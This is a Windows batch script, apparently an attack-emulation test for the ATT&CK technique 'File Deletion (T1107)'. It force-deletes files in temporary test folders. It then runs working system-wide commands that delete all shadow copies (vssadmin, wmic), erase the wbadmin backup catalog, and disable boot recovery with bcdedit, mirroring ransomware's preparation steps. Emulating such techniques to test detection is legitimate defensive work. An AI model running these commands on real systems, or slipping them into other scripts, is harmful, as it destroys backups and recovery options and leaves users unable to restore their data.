@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: File Deletion (T1107)
ECHO.
ECHO [+] Deleting files using CMD and Powershell
ECHO -------------------------------------------------------------------
del /f C:\Windows\Temp\victim-files-cmd\a
del /f /S C:\Windows\Temp\victim-files-cmd
powershell -ep bypass Remove-Item -path "C:\Windows\Temp\victim-files-ps\a"
powershell -ep bypass Remove-Item -path "C:\Windows\Temp\victim-files-ps\" -recurse
ECHO.

ECHO [+] Using 'VSSADMIN' 'WMIC' 'wbadmin' to delete System Shadow Copies catalogs
ECHO -------------------------------------------------------------------
vssadmin.exe Delete Shadows /All /Quiet
wmic shadowcopy delete
wbadmin delete catalog -quiet
ECHO.

ECHO [+] Chaning BOOT Recovery config using 'bcdedit' 
ECHO -------------------------------------------------------------------
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
ECHO.